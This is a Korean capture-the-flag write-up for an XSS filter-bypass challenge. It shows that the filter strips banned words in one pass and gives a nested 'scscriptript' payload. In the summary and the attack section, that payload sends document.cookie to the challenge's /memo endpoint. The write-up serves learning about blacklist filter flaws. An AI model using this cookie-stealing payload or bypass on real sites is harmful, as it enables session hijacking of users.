---
title: "XSS Filtering Bypass (DH, B2)"
date: 2026-06-23
draft: false
tags: ["XSS"]
ShowToc: true
---

## TL;DR

- 취약점: `/vuln`이 `param`을 `xss_filter` 통과 후 응답에 직접 출력 → 서버 출력 sink, `<script>` 실행 가능
- 핵심 트릭: 필터가 단발 `replace`라 치환 결과를 재검사 안 함 → 금지어 중첩(`scscriptript`)으로 부활
- 페이로드: `<scscriptript>new Image().src="http://127.0.0.1:8000/memo?memo=" + document.cookie</scscriptript>`

## 분석

| 엔드포인트 | 동작 |
|---|---|
| `/vuln` | `param`을 `xss_filter` 후 응답에 직접 출력 |
| `/flag` | POST `param`을 `check_xss`로 넘겨 FLAG 쿠키 든 봇 호출 |
| `/memo` | 전역변수 `memo_text`에 누적 저장·노출 |

```python
def xss_filter(text):
    _filter = ["script", "on", "javascript:"]
    for f in _filter:
        if f in text.lower():
            text = text.replace(f, "")
    return text
```

## 취약점

서버가 `param`을 응답 본문에 직접 출력 → `<script>`가 파서에 그대로 걸려 실행.
급소: 필터는 `script`, `on`, `javascript:`를 대소문자 무관 제거하지만, 각 금지어를 한 번만 `replace`하고 결과를 재검사하지 않는다.

## 공격

흐름은 XSS-1과 동일(봇 호출 → `/vuln` 실행 → 쿠키 읽기 → `/memo` 전송 → 확인).

1. 필터 결함 확인: 각 금지어를 단발 `replace`로 제거, 제거 후 결과 재검사 없음
2. 우회: 금지어 안에 같은 금지어를 한 겹 중첩 → 바깥이 제거되면 양옆이 붙어 부활 (`script`→`scscriptript`, `on`→`oonn`)
3. 본문(`new Image().src ... document.cookie`)은 금지어 미포함이라 그대로 통과 → 태그만 중첩 우회

```html
<scscriptript>new Image().src="http://127.0.0.1:8000/memo?memo=" + document.cookie</scscriptript>
```

검증은 쪼개서: `/vuln?param=<scscriptript>alert(1)</scscriptript>`(복원·실행 확인) → `memo=test`(전송 통로) → `document.cookie`(탈취).

> 핵심 당위: 단발 `replace`는 한 번의 좌→우 스캔에서 만난 것만 지우고 치환 결과는 재스캔하지 않는다 → `scscriptript`의 가운데 `script`가 빠지면 `sc`+`ript`가 붙어 `script`로 복원된다.

## 배운 점

- 블랙리스트 + 단발 `replace`의 전형적 결함: 제거 후 재검사 부재 → 금지어 중첩으로 부활
- 판별점: 필터가 결과 불변까지 반복(`while`)인가 단발인가 → 단발이면 중첩 우회 성립
- 본문에 금지어가 없으면 태그만 우회하면 끝 → 우회 대상을 최소 범위로 좁혀 생각